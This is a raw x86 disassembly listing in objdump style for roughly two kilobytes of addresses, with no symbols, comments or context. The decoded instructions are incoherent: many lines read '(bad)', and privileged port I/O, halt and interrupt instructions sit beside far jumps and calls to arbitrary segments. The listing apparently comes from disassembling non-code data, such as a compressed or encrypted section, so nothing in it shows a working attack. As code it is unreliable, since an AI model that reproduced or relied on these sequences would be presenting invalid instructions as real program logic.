  42048d:	mov    bh,0xcd
  42048f:	mov    bh,0x83
  420491:	inc    BYTE PTR [edi]
  420493:	out    dx,eax
  420494:	sub    al,0x6d
  420496:	pushf  
  420497:	xchg   edi,eax
  420498:	sub    DWORD PTR [edi],0x82e6087d
  42049e:	adc    cl,BYTE PTR [ebx-0x75ff6142]
  4204a4:	lods   eax,DWORD PTR gs:[esi]
  4204a6:	jle    0x420463
  4204a8:	adc    BYTE PTR [edi],0x84
  4204ab:	mov    edi,0xc04c130b
  4204b0:	mov    ebp,gs
  4204b2:	dec    ebp
  4204b3:	push   edi
  4204b4:	push   esp
  4204b5:	inc    esp
  4204b6:	outs   dx,DWORD PTR ds:[esi]
  4204b7:	(bad)  
  4204b8:	sbb    al,BYTE PTR [edx]
  4204ba:	sbb    ebx,esp
  4204bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204bd:	fiadd  WORD PTR [ebp-0x5171e6ec]
  4204c3:	add    eax,0xca65666e
  4204c8:	les    ebp,FWORD PTR [esi]
  4204ca:	and    DWORD PTR [eax+0x47109ede],esi
  4204d0:	push   esi
  4204d2:	mov    al,0xa1
  4204d4:	fs call 0xdd0f08d2
  4204da:	push   0xd0a7d2a4
  4204df:	repnz pop esi
  4204e1:	cwde   
  4204e2:	jg     0x42046d
  4204e4:	jmp    0x420548
  4204e6:	or     DWORD PTR [ecx],esp
  4204e8:	mov    DWORD PTR [eax],0x612608ee
  4204ee:	mov    ecx,0x34e90380
  4204f3:	mov    cl,0x69
  4204f5:	push   ecx
  4204f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204f7:	push   cs
  4204f8:	or     al,0xb6
  4204fa:	jl     0x4204be
  4204fc:	sti    
  4204fd:	or     esp,DWORD PTR [edx]
  4204ff:	jno    0x4204a0
  420501:	inc    edi
  420502:	mov    ds:0xf454e452,al
  420507:	or     BYTE PTR [ebp+0x8],bh
  42050a:	jnp    0x42052a
  42050c:	mov    BYTE PTR [edx],bh
  42050e:	test   eax,0x9c2b4218
  420513:	cmp    al,0xa1
  420515:	push   ss
  420516:	and    BYTE PTR [ebx],bh
  420518:	lds    edi,FWORD PTR [ecx-0x7c31eec1]
  42051e:	xchg   esi,eax
  42051f:	pop    eax
  420520:	inc    esi
  420521:	fmul   QWORD PTR [edx-0x21]
  420524:	mov    esi,0xbc9150a1
  420529:	sub    BYTE PTR [eax+0x1f21eae9],0x35
  420530:	in     al,0x6c
  420532:	xchg   edi,eax
  420533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420534:	xchg   edx,eax
  420535:	mov    ch,0xa3
  420537:	data16 jno 0x4204d0
  42053a:	mov    ecx,0xae95dfc6
  42053f:	inc    eax
  420540:	retf   0x5636
  420543:	mov    dh,0xd0
  420545:	sub    al,0x28
  420547:	icebp  
  420548:	pop    es
  420549:	in     al,dx
  42054a:	push   ecx
  42054b:	jae    0x420544
  42054d:	xchg   esp,eax
  42054e:	mov    ecx,0x395e8331
  420553:	ss push esp
  420555:	mov    dh,0x43
  420557:	enter  0xbe6c,0x60
  42055b:	out    0x3f,al
  42055d:	add    DWORD PTR [bx+0x7674],edx
  420562:	push   ds
  420563:	test   DWORD PTR [ebp-0x1d884be4],esp
  420569:	neg    BYTE PTR [ecx-0x3cd85f98]
  42056f:	jg     0x4205a3
  420571:	xchg   edx,eax
  420572:	aam    0x2
  420574:	mov    bl,dl
  420576:	shl    BYTE PTR [edi-0x3d],cl
  420579:	xor    al,0x9e
  42057b:	in     al,0xcc
  42057d:	and    DWORD PTR ds:0xe54736a6,edi
  420583:	add    BYTE PTR ds:0xdb889d7e,ch
  420589:	call   0xc564:0x31268ea3
  420590:	mov    ch,0xcd
  420592:	and    edi,DWORD PTR [ebx+0x356c594]
  420598:	mov    ebp,0xf5ebeb6b
  42059d:	push   eax
  42059e:	aaa    
  42059f:	adc    esi,esp
  4205a1:	mov    DWORD PTR [eax+0xed29b26],edx
  4205a7:	ja     0x420599
  4205a9:	mov    bl,0xa1
  4205ab:	je     0x42054f
  4205ad:	iret   
  4205ae:	cmc    
  4205af:	in     al,dx
  4205b0:	std    
  4205b1:	sbb    DWORD PTR [ecx],esi
  4205b3:	or     eax,0x64
  4205b6:	scas   eax,DWORD PTR es:[edi]
  4205b7:	jecxz  0x420635
  4205b9:	sbb    esp,DWORD PTR [eax]
  4205bb:	dec    esp
  4205bc:	cli    
  4205bd:	in     eax,0xf8
  4205bf:	dec    ecx
  4205c0:	nop
  4205c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205c2:	sti    
  4205c3:	pop    edx
  4205c4:	sub    ecx,DWORD PTR [ebx]
  4205c6:	int    0x44
  4205c8:	fldenv [edx]
  4205ca:	(bad)  
  4205cc:	aas    
  4205cd:	xchg   edx,eax
  4205ce:	dec    ecx
  4205cf:	push   esi
  4205d0:	sub    DWORD PTR [edx],edi
  4205d2:	inc    ebx
  4205d3:	(bad)  
  4205d4:	(bad)  
  4205d5:	mov    cl,0x63
  4205d7:	hlt    
  4205d8:	into   
  4205d9:	mov    ecx,0x96c046bf
  4205de:	outs   dx,DWORD PTR ds:[esi]
  4205df:	out    0x7,eax
  4205e1:	les    edx,FWORD PTR [ebx]
  4205e3:	xchg   esi,eax
  4205e4:	popf   
  4205e5:	sub    cl,BYTE PTR [esi]
  4205e7:	pop    esp
  4205e8:	popa   
  4205e9:	jp     0x420630
  4205eb:	fistp  WORD PTR [eax-0x4d]
  4205ee:	jl     0x420655
  4205f0:	jle    0x4205d5
  4205f2:	dec    eax
  4205f3:	mov    eax,ds:0x8cdf7faf
  4205f8:	jge    0x420616
  4205fa:	das    
  4205fb:	and    BYTE PTR [edx-0x2c7d05f0],bl
  420601:	add    eax,0xb486eca3
  420606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420607:	cli    
  420608:	xor    eax,0x7e901a5a
  42060d:	sbb    ch,BYTE PTR ds:0x86c9ef37
  420613:	test   BYTE PTR [edi],al
  420615:	adc    BYTE PTR [ebp-0x71],0xe9
  420619:	lods   eax,DWORD PTR ds:[esi]
  42061a:	sub    edx,DWORD PTR [eax]
  42061c:	pop    es
  42061d:	xor    al,0x37
  42061f:	lds    esi,FWORD PTR [edx+ebp*2]
  420622:	dec    edx
  420623:	bswap  edi
  420625:	xlat   BYTE PTR ds:[ebx]
  420626:	mov    WORD PTR [edi-0x2cd6722d],?
  42062c:	pop    es
  42062d:	sbb    bh,BYTE PTR [ebp+0x72]
  420630:	fcomp  QWORD PTR [esi]
  420632:	in     al,dx
  420633:	push   ds
  420634:	mov    edi,0xe3c27e25
  420639:	cli    
  42063a:	jno    0x420626
  42063c:	fsub   QWORD PTR [ecx-0x17]
  42063f:	push   ebp
  420640:	sub    eax,0x9f1d8308
  420645:	rcr    BYTE PTR [edx-0x328d08a2],cl
  42064b:	dec    esi
  42064c:	mov    eax,0xfec48183
  420651:	into   
  420652:	mov    ch,BYTE PTR fs:[esi+0x3a249e49]
  420659:	add    BYTE PTR [edi+0xeb5d45d],ah
  42065f:	or     bl,BYTE PTR [edi+ebp*4-0x6f53e8ba]
  420666:	jmp    0x9042:0x3967fccc
  42066d:	scas   eax,DWORD PTR es:[edi]
  42066e:	loopne 0x4206b2
  420670:	stos   DWORD PTR es:[edi],eax
  420671:	(bad)  
  420672:	out    dx,al
  420673:	xor    BYTE PTR [ebp+0x1c],al
  420676:	mov    ds:0x7073ccb9,eax
  42067b:	add    dh,BYTE PTR [edx+ebx*8+0x58]
  42067f:	push   ds
  420680:	mov    cs:0xa56bc455,eax
  420686:	popa   
  420687:	mov    dh,0x8e
  420689:	ret    
  42068a:	fisubr DWORD PTR [ebx]
  42068c:	add    DWORD PTR [esi+0x317d6c0c],edi
  420692:	dec    edi
  420693:	sbb    edi,edx
  420695:	mov    al,0x22
  420697:	cdq    
  420698:	fdivr  DWORD PTR [edx+0x6a]
  42069b:	loopne 0x420702
  42069d:	and    al,0x5a
  42069f:	inc    esp
  4206a0:	cmp    eax,0xe5286a4
  4206a5:	mov    ebx,ds
  4206a7:	arpl   WORD PTR [eax],bx
  4206a9:	das    
  4206aa:	loope  0x4206bb
  4206ac:	mov    ecx,0xdc732b53
  4206b1:	cs daa 
  4206b3:	cdq    
  4206b4:	jl     0x420702
  4206b6:	pusha  
  4206b7:	pop    ds
  4206b8:	in     eax,0xca
  4206ba:	fsub   QWORD PTR [eax+0x1655440f]
  4206c0:	mov    ss,WORD PTR [ecx]
  4206c2:	cwde   
  4206c3:	pop    edi
  4206c4:	popa   
  4206c5:	stc    
  4206c6:	push   ecx
  4206c7:	mov    al,0xe
  4206c9:	inc    eax
  4206ca:	mov    eax,ds:0x76c52c09
  4206cf:	shl    DWORD PTR [esp+eax*2-0x52],1
  4206d3:	sub    al,0x88
  4206d5:	out    0x92,al
  4206d7:	(bad)  ds:0x4ad574f1
  4206dd:	jns    0x420757
  4206df:	jno    0x42068d
  4206e1:	pop    edi
  4206e2:	sub    eax,0x844422e6
  4206e7:	loopne 0x4206f5
  4206e9:	mov    esi,0x7320e868
  4206ef:	xchg   edi,eax
  4206f0:	sbb    DWORD PTR [edx+0x6dbc5727],edx
  4206f6:	pop    ds
  4206f7:	popf   
  4206f8:	dec    eax
  4206f9:	lahf   
  4206fa:	or     bl,BYTE PTR [ebx]
  4206fc:	je     0x42072e
  4206fe:	imul   ecx,edi,0xfffffffb
  420701:	mov    ebx,0x6aaf3239
  420706:	pop    eax
  420707:	mov    ch,0xa2
  420709:	pop    ss
  42070a:	cmc    
  42070b:	addr16 test al,0x5
  42070e:	aas    
  42070f:	fild   DWORD PTR [edi+ebp*1+0x1c]
  420713:	lahf   
  420714:	nop
  420715:	test   eax,0xace9903c
  42071a:	mov    esi,0xf1ead8de
  42071f:	jo     0x420765
  420721:	int3   
  420722:	or     BYTE PTR [eax-0x46],cl
  420725:	or     DWORD PTR [edi+0x0],ebp
  420728:	xchg   ecx,eax
  420729:	aas    
  42072a:	inc    eax
  42072b:	mov    dh,BYTE PTR [eax+0xd]
  42072e:	ds inc esp
  420730:	nop
  420731:	push   eax
  420732:	call   0xe706:0xe53b0d1a
  420739:	popf   
  42073a:	mov    ebp,0xbc57e388
  42073f:	cmp    ebp,esi
  420741:	cld    
  420742:	dec    ecx
  420743:	lods   eax,DWORD PTR ds:[esi]
  420744:	adc    BYTE PTR gs:[edi-0x3eed5b2f],ah
  42074b:	dec    edi
  42074c:	stos   BYTE PTR es:[edi],al
  42074d:	cld    
  42074e:	lahf   
  42074f:	out    dx,eax
  420750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420752:	sbb    eax,0xddaef64
  420757:	add    ecx,esi
  420759:	and    eax,0xa9db6f3b
  42075e:	jae    0x42074f
  420760:	test   al,0x79
  420762:	mov    edi,0x9be14acf
  420767:	push   es
  420768:	add    DWORD PTR [eax],edi
  42076a:	add    BYTE PTR [edi],ah
  42076c:	cdq    
  42076d:	adc    ch,0x5b
  420770:	mov    ah,0xed
  420772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420773:	xlat   BYTE PTR ds:[ebx]
  420774:	adc    ecx,DWORD PTR [edx+0x60]
  420777:	mov    DWORD PTR [eax+0x33],eax
  42077a:	add    eax,ebp
  42077c:	leave  
  42077d:	fistp  QWORD PTR [esi-0x4]
  420780:	push   0xd1ca73fd
  420785:	mov    al,ds:0x238f3677
  42078a:	xchg   edi,ebx
  42078c:	lods   eax,DWORD PTR ds:[esi]
  42078d:	jg     0x420711
  42078f:	sahf   
  420790:	test   edx,esp
  420792:	cmp    esi,ebx
  420794:	push   ebp
  420795:	clc    
  420796:	pop    edx
  420797:	dec    edi
  420798:	xchg   DWORD PTR [eax-0x21aae69b],ebx
  42079e:	scas   al,BYTE PTR es:[edi]
  42079f:	and    edi,DWORD PTR [edx]
  4207a1:	push   edi
  4207a2:	add    eax,0xe47dc6e4
  4207a7:	xchg   edi,eax
  4207a8:	call   0xd876:0x660490ba
  4207af:	push   es
  4207b0:	outs   dx,BYTE PTR ds:[esi]
  4207b1:	sti    
  4207b2:	inc    edi
  4207b3:	sub    al,0xbd
  4207b5:	adc    dh,BYTE PTR [ebp+0x4a169033]
  4207bb:	jmp    0x2224:0xc9f08175
  4207c2:	shl    BYTE PTR [ebx],0xd8
  4207c5:	popa   
  4207c6:	push   0x532b9578
  4207cb:	in     al,dx
  4207cc:	loope  0x4207d0
  4207ce:	pushf  
  4207cf:	shl    DWORD PTR [esi+0x4dada513],cl
  4207d5:	xor    BYTE PTR [edx],bl
  4207d7:	out    0x6e,al
  4207d9:	push   ebx
  4207da:	mov    al,ds:0xa7de7e15
  4207df:	sbb    DWORD PTR [esi+ebp*4+0xf],edx
  4207e3:	popf   
  4207e4:	cwde   
  4207e5:	pop    ds
  4207e6:	mov    ecx,0x6ae3516a
  4207eb:	xchg   ecx,eax
  4207ec:	sbb    BYTE PTR [edx],dl
  4207ee:	ret    
  4207ef:	lock dec ebx
  4207f1:	ds hlt 
  4207f3:	or     al,0xb1
  4207f5:	cmp    DWORD PTR [ecx+0x54af3413],ecx
  4207fb:	cdq    
  4207fc:	or     eax,0xb650ccef
  420801:	cmc    
  420802:	(bad)  
  420803:	rol    DWORD PTR [edx+0x5378014d],1
  420809:	sub    DWORD PTR [ecx-0x23],edi
  42080c:	push   ebx
  42080d:	lock test DWORD PTR [edx-0x309b464b],ebp
  420814:	(bad)  
  420815:	(bad)  [ecx+0x27]
  420818:	int3   
  420819:	pop    ebx
  42081a:	jne    0x420832
  42081c:	sub    ch,ch
  42081e:	retf   
  42081f:	sub    esp,DWORD PTR [edx]
  420821:	dec    esp
  420822:	jb     0x42082c
  420824:	stos   DWORD PTR es:[edi],eax
  420825:	xchg   ebx,eax
  420826:	cmp    DWORD PTR [edi+0x4346e9b1],0xc240acd6
  420830:	(bad)  
  420831:	scas   eax,DWORD PTR es:[edi]
  420832:	call   ecx
  420834:	sbb    DWORD PTR [edi-0x29ff2a34],eax
  42083a:	iret   
  42083b:	outs   dx,BYTE PTR ds:[esi]
  42083c:	out    0xf9,eax
  42083e:	inc    edi
  42083f:	and    al,0x9e
  420841:	push   ecx
  420842:	mov    esp,0xe5b19ffa
  420847:	mov    esi,?
  420849:	ret    0xf150
  42084c:	xor    al,bh
  42084e:	arpl   dx,cx
  420850:	mov    ds:0x6dc6addf,al
  420855:	inc    edx
  420856:	jae    0x4208c2
  420858:	leave  
  420859:	xor    ch,BYTE PTR [edx-0x1990f8a]
  42085f:	enter  0xee5a,0x9d
  420863:	and    BYTE PTR [edx+edi*8],bl
  420866:	inc    edx
  420867:	push   ds
  420868:	cmp    eax,0xd4228579
  42086d:	hlt    
  42086e:	inc    edx
  42086f:	adc    ah,BYTE PTR [esi]
  420871:	retf   0xd379
  420874:	test   BYTE PTR [esi+eiz*4],bh
  420877:	mov    dh,0x37
  420879:	xchg   edx,eax
  42087a:	lods   al,BYTE PTR ds:[esi]
  42087b:	jge    0x42086f
  42087d:	inc    BYTE PTR [eax-0x2eba089]
  420883:	sbb    eax,0x81736f94
  420888:	sub    dl,BYTE PTR [ecx+0x10]
  42088b:	mov    al,0x95
  42088d:	sbb    eax,0x54b25cdb
  420892:	lds    edx,FWORD PTR [ecx+0xf]
  420895:	gs cli 
  420897:	and    BYTE PTR [ecx+0x1085473f],cl
  42089d:	push   ss
  42089e:	inc    ebx
  42089f:	add    al,0xa2
  4208a1:	sti    
  4208a2:	sahf   
  4208a3:	adc    esi,0x65
  4208a6:	push   es
  4208a7:	xchg   ebx,eax
  4208a8:	(bad)  
  4208a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208aa:	nop
  4208ab:	and    eax,0x1bf4dc4d
  4208b0:	stos   BYTE PTR es:[edi],al
  4208b1:	popf   
  4208b2:	mov    bh,bh
  4208b4:	push   ebp
  4208b5:	aad    0x4e
  4208b7:	mov    ch,bl
  4208b9:	sub    DWORD PTR [ecx],eax
  4208bb:	popf   
  4208bc:	ret    
  4208bd:	adc    eax,0xfdeb2b23
  4208c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208c3:	jecxz  0x4208cf
  4208c5:	mov    WORD PTR [edx+0x17],ss
  4208c8:	sbb    eax,0xc715b0e
  4208cd:	jge    0x4208a8
  4208cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208d0:	outs   dx,BYTE PTR ds:[esi]
  4208d1:	imul   edx,DWORD PTR [edx+ebx*2-0x40],0xe2e2c18f
  4208d9:	cmp    DWORD PTR [ebx+0x1a51d44],0x21
  4208e0:	push   esp
  4208e1:	cmp    edx,edx
  4208e3:	mov    ebp,0xcbebc6ce
  4208e8:	mov    BYTE PTR [eax],dl
  4208ea:	xchg   edi,eax
  4208eb:	(bad)  
  4208ec:	sbb    ebp,esi
  4208ee:	dec    esi
  4208ef:	jb     0x42093a
  4208f1:	jbe    0x4208d5
  4208f3:	inc    ebp
  4208f4:	pop    bx
  4208f6:	adc    eax,0xd84668bd
  4208fb:	or     ebx,esi
  4208fd:	sbb    al,0x32
  4208ff:	aas    
  420900:	js     0x4208c4
  420902:	jecxz  0x4208f4
  420904:	jo     0x4208fa
  420906:	cld    
  420907:	enter  0xb876,0xfa
  42090b:	push   esp
  42090c:	pop    edi
  42090d:	les    ebp,FWORD PTR [ecx]
  42090f:	cli    
  420910:	xor    esp,DWORD PTR [edx+0x5e]
  420913:	fst    QWORD PTR [ebp-0x69]
  420916:	retf   0x9646
  420919:	icebp  
  42091a:	imul   ebx,DWORD PTR [ebp-0xa],0x18
  42091e:	daa    
  42091f:	xor    BYTE PTR [ebp-0x47],ch
  420922:	pop    esp
  420923:	jo     0x42090b
  420925:	push   edx
  420926:	push   ss
  420927:	in     eax,0xb9
  420929:	push   ds
  42092a:	inc    ebx
  42092b:	aaa    
  42092c:	(bad)  
  42092d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092f:	cmp    eax,0xf9c613f1
  420934:	push   edi
  420935:	shr    ebp,cl
  420937:	or     al,0x7c
  420939:	rcr    ebx,0xc4
  42093c:	hlt    
  42093d:	mov    ds:0xb97e5a1f,al
  420942:	test   al,0xbb
  420944:	jb     0x4209b9
  420946:	outs   dx,DWORD PTR ds:[esi]
  420947:	cmp    BYTE PTR [edx+0x47],dh
  42094a:	enter  0x6118,0xde
  42094e:	out    dx,eax
  42094f:	test   al,0x46
  420951:	(bad)  
  420952:	pop    esi
  420953:	jl     0x42093b
  420955:	es pop edx
  420957:	dec    ebp
  420958:	clc    
  420959:	test   eax,0xe16f4e3b
  42095e:	popf   
  42095f:	das    
  420960:	or     cl,bh
  420962:	mov    eax,0x32a6d378
  420967:	out    0xeb,al
  420969:	xchg   ebp,eax
  42096a:	(bad)  
  42096c:	or     cl,BYTE PTR [esp+edi*8-0x5b]
  420970:	popa   
  420971:	imul   esi,DWORD PTR [ecx],0xd334f6ba
  420977:	jge    0x420950
  420979:	inc    ebp
  42097a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42097b:	fisub  DWORD PTR [eax+0x72]
  42097e:	icebp  
  42097f:	xor    ebx,ecx
  420981:	sub    eax,DWORD PTR [ecx]
  420983:	out    0xb6,eax
  420985:	addr16 imul edx,edi,0x48
  420989:	or     esp,DWORD PTR [esi-0x6facbdf5]
  42098f:	cmp    eax,0xd6a606ac
  420994:	push   ss
  420995:	inc    esp
  420996:	add    esp,DWORD PTR [ebx+0x318f16c9]
  42099c:	push   ebx
  42099d:	cmc    
  42099e:	jg     0x4209dd
  4209a0:	popa   
  4209a1:	mov    al,al
  4209a3:	add    bh,dl
  4209a5:	cmp    eax,0x76e88b99
  4209aa:	jmp    DWORD PTR [esi]
  4209ac:	or     BYTE PTR [ebx],dl
  4209ae:	(bad)  
  4209b0:	lds    esi,FWORD PTR [edx+0x4c]
  4209b3:	lods   al,BYTE PTR ds:[esi]
  4209b4:	int    0xac
  4209b6:	inc    edx
  4209b7:	pop    ss
  4209b8:	xchg   edx,eax
  4209b9:	cmp    esp,DWORD PTR [ebx]
  4209bb:	cdq    
  4209bc:	pop    eax
  4209bd:	and    BYTE PTR ds:0x4cf3dc3c,dh
  4209c3:	sbb    edi,DWORD PTR [eax-0x5]
  4209c6:	sahf   
  4209c7:	mov    esp,0x23fd609e
  4209cc:	or     BYTE PTR [edi],ah
  4209ce:	adc    DWORD PTR [eax+edx*4+0x7a],esi
  4209d2:	es out 0xf9,eax
  4209d5:	pop    esi
  4209d6:	outs   dx,DWORD PTR ds:[esi]
  4209d7:	mov    edx,0xdf20f5a0
  4209dc:	jbe    0x4209ba
  4209de:	jecxz  0x420a5a
  4209e0:	inc    edx
  4209e1:	fdiv   DWORD PTR [esi]
  4209e3:	jns    0x420a3d
  4209e5:	or     al,0x2d
  4209e7:	outs   dx,DWORD PTR ds:[esi]
  4209e8:	sbb    DWORD PTR [ebx-0x3179e6bc],eax
  4209ee:	ds daa 
  4209f0:	mov    bh,0xa
  4209f2:	or     DWORD PTR [ebx-0x71],0x3f
  4209f6:	int3   
  4209f7:	arpl   dx,sp
  4209f9:	jl     0x420a64
  4209fb:	or     bh,BYTE PTR [esi-0x16]
  4209fe:	mov    ebx,DWORD PTR [esp+esi*2+0x3]
  420a02:	out    dx,eax
  420a03:	xor    BYTE PTR [edx],dl
  420a05:	mov    cl,0xb2
  420a07:	int3   
  420a08:	cmp    eax,DWORD PTR [ecx-0x43]
  420a0b:	shl    BYTE PTR [ebp+0x2d],0xe3
  420a0f:	fs je  0x420a0b
  420a12:	inc    ebp
  420a13:	adc    eax,0x9724f0bb
  420a18:	inc    edi
  420a19:	inc    ebp
  420a1a:	enter  0x4c65,0x7f
  420a1e:	sahf   
  420a1f:	aas    
  420a20:	xor    dh,BYTE PTR [esi+0x75]
  420a23:	sar    BYTE PTR [ebp-0x6676c48c],cl
  420a29:	xor    eax,0xf46f89d1
  420a2e:	pop    ss
  420a2f:	xlat   BYTE PTR ds:[ebx]
  420a30:	leave  
  420a31:	add    al,0xac
  420a33:	call   0xe4d96c83
  420a38:	and    cl,BYTE PTR [edi+0x6c2aed28]
  420a3e:	es sbb edx,esp
  420a41:	ja     0x420aa3
  420a43:	or     bl,BYTE PTR [eax]
  420a45:	bound  edx,QWORD PTR [ebp-0x9e59628]
  420a4b:	in     eax,dx
  420a4c:	out    0xd2,eax
  420a4e:	lea    edi,ds:0xdd2ea1a8
  420a54:	pop    ebp
  420a55:	sbb    eax,DWORD PTR gs:[ebp+0x26683a5c]
  420a5c:	aas    
  420a5d:	(bad)  
  420a5e:	mov    al,ds:0xa944b06b
  420a63:	(bad)  
  420a65:	cmp    eax,0xb3469b39
  420a6a:	lea    eax,[eax]
  420a6c:	sahf   
  420a6d:	mov    edi,0x1a6cfd96
  420a72:	(bad)  
  420a73:	out    0xfe,al
  420a75:	cmc    
  420a76:	mov    ecx,0xb402ccca
  420a7b:	out    0xb9,al
  420a7d:	or     esi,esp
  420a7f:	xor    ah,bl
  420a81:	mov    ch,0x3a
  420a83:	mov    al,ds:0x1298b1c4
  420a88:	jnp    0x420a48
  420a8a:	sub    eax,0x91087810
  420a8f:	xor    BYTE PTR [edi-0x69ece9d0],bl
  420a95:	mov    esp,0x117017fe
  420a9a:	sbb    DWORD PTR [eax+0x13],edi
  420a9d:	jno    0x420aaa
  420a9f:	pminub mm3,mm3
  420aa2:	ja     0x420add
  420aa4:	push   cs
  420aa5:	xchg   ebx,eax
  420aa6:	jle    0x420a81
  420aa8:	xor    ah,dl
  420aaa:	mov    esp,DWORD PTR [edi]
  420aac:	pop    ebx
  420aad:	rcl    BYTE PTR ds:[eax-0x71d49ca9],0xb1
  420ab5:	rcr    BYTE PTR [ecx],0x71
  420ab8:	push   ebx
  420ab9:	jle    0x420a97
  420abb:	sub    dh,BYTE PTR ds:0x26c74d13
  420ac1:	add    al,BYTE PTR [edi]
  420ac3:	test   DWORD PTR [ecx+0x9],ecx
  420ac6:	jb     0x420a64
  420ac8:	mov    cl,0xa5
  420aca:	adc    esp,DWORD PTR es:0x5d4607c5
  420ad1:	test   eax,0x6e343fa0
  420ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ad7:	push   cs
  420ad8:	jmp    0xc210:0x2bc5dcd9
  420adf:	xor    edx,DWORD PTR [esi+0x477d3cb7]
  420ae5:	cli    
  420ae6:	sahf   
  420ae7:	push   edx
  420ae8:	jmp    0x420a7d
  420aea:	cmp    BYTE PTR [esi-0x79891df6],dl
  420af0:	cdq    
  420af1:	mov    dl,0x52
  420af3:	cmp    esp,esi
  420af5:	ds sbb edx,ecx
  420af8:	js     0x420af7
  420afa:	fisubr WORD PTR [eax-0x3d33eefa]
  420b00:	retf   
  420b01:	inc    esi
  420b02:	ins    DWORD PTR es:[edi],dx
  420b03:	rcr    BYTE PTR [ebp+eax*2+0x49230a64],0x26
  420b0b:	(bad)  [esi-0x69]
  420b0e:	jno    0x420ade
  420b10:	stos   DWORD PTR es:[edi],eax
  420b11:	in     al,0x23
  420b13:	inc    esi
  420b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b15:	adc    eax,0xcf2fe804
  420b1a:	push   0x6d
  420b1c:	dec    esi
  420b1d:	cld    
  420b1e:	push   esi
  420b1f:	dec    eax
  420b20:	sub    dl,BYTE PTR [edx]
  420b22:	inc    esi
  420b23:	ins    BYTE PTR es:[edi],dx
  420b24:	inc    edi
  420b25:	mov    ah,0x6a
  420b27:	aaa    
  420b28:	enterw 0x7531,0x32
  420b2d:	(bad)  
  420b2e:	and    eax,0x3c125356
  420b33:	out    0x8c,eax
  420b35:	pop    esp
  420b36:	das    
  420b37:	je     0x420b10
  420b39:	mov    bl,ch
  420b3b:	shr    dl,cl
  420b3d:	sbb    DWORD PTR [ecx],0xdb63e4b7
  420b43:	imul   ebx,ebp,0x1c
  420b46:	xchg   esp,eax
  420b47:	push   ecx
  420b48:	inc    bx
  420b4a:	pop    edx
  420b4b:	cwde   
  420b4c:	mov    dh,0x81
  420b4e:	inc    ebx
  420b4f:	popa   
  420b50:	das    
  420b51:	pop    edi
  420b52:	aas    
  420b53:	adc    DWORD PTR [ecx-0x4fdf0454],edi
  420b59:	mov    al,ds:0x11a50cc1
  420b5e:	or     BYTE PTR [ebx-0x10c5db02],bl
  420b64:	pop    ecx
  420b65:	test   eax,0x61f79d59
  420b6a:	lds    ecx,FWORD PTR ds:0x32efe19b
  420b70:	int3   
  420b71:	scas   al,BYTE PTR es:[edi]
  420b72:	inc    edx
  420b73:	call   0xf401:0xf9ebab7e
  420b7a:	mov    ecx,0xaef429f5
  420b7f:	(bad)  
  420b80:	and    al,0xa3
  420b82:	ret    
  420b83:	mov    al,ds:0xffaf967f
  420b88:	sti    
  420b89:	xchg   ebx,eax
  420b8a:	sub    BYTE PTR [ebp-0x4c14e91d],dl
  420b90:	fadd   st(2),st
  420b92:	push   bp
  420b94:	retf   0xdfeb
  420b97:	jmp    0x420b5c
  420b99:	jle    0x420b80
  420b9b:	scas   al,BYTE PTR es:[edi]
  420b9c:	push   ebx
  420b9d:	cmp    edi,DWORD PTR [edi+0x59]
  420ba0:	xor    eax,esi
  420ba2:	mov    esi,0x269ddf89
  420ba7:	sar    BYTE PTR [ebp+ecx*2+0x392050fa],1
  420bae:	retf   0x613c
  420bb1:	sub    esp,esi
  420bb3:	dec    edi
  420bb4:	repz jno 0x420b4e
  420bb7:	js     0x420b9e
  420bb9:	add    esi,esp
  420bbb:	pop    ss
  420bbc:	fnstsw WORD PTR [esi-0x7eae293d]
  420bc2:	xor    eax,0x942dba7f
  420bc7:	xor    ebp,ecx
  420bc9:	sub    bh,BYTE PTR [edx]
  420bcb:	jbe    0x420b59
  420bcd:	ds cld 
  420bcf:	sbb    DWORD PTR [ebx-0x1a53b0dd],edi
  420bd5:	test   BYTE PTR [ecx+0x1d],al
  420bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd9:	hlt    
  420bda:	stc    
  420bdb:	jle    0x420c44
  420bdd:	push   0x52
  420bdf:	xchg   esi,eax
  420be0:	pop    eax
  420be1:	imul   ecx,DWORD PTR [ebp-0x54],0xffffff82
  420be5:	jno    0x420bdb
  420be7:	dec    eax
  420be8:	in     al,0x2a
  420bea:	sub    BYTE PTR [ecx-0x15],dh
  420bed:	sub    DWORD PTR [ebx],esp
  420bef:	pop    esp
  420bf0:	adc    DWORD PTR [esi+0x716db8c3],edx
  420bf6:	cmp    BYTE PTR [edx],ah
  420bf8:	shr    BYTE PTR [ecx-0x44],1
  420bfb:	rcl    BYTE PTR [esi],1
  420bfd:	push   ecx
  420bfe:	stos   BYTE PTR es:[edi],al
  420bff:	mul    BYTE PTR [esi-0x3e]
  420c02:	pop    edx
  420c03:	jns    0x420c36
  420c05:	jmp    0x296a:0x93293cd8
  420c0c:	xchg   ebx,eax
  420c0d:	scas   eax,DWORD PTR es:[edi]
  420c0e:	clc    
  420c0f:	jb     0x420b9e
  420c11:	inc    esp
  420c12:	and    BYTE PTR [ecx],bh
  420c14:	inc    eax
  420c15:	fcom   QWORD PTR [ebx-0x3f]
  420c18:	jbe    0x420bff
  420c1a:	push   ds
  420c1b:	push   ebx
  420c1c:	adc    eax,0xd1d141b0
  420c21:	mov    cl,0xc0
  420c23:	mov    ss,WORD PTR [edi+0x38]
  420c26:	xchg   ebp,eax
  420c27:	mov    esi,0xf1da9a99
  420c2c:	sbb    DWORD PTR [esi],0xb10efcb5
  420c32:	or     ebp,DWORD PTR ds:0x814b62f0
  420c38:	sbb    BYTE PTR [edx+0x8],bl
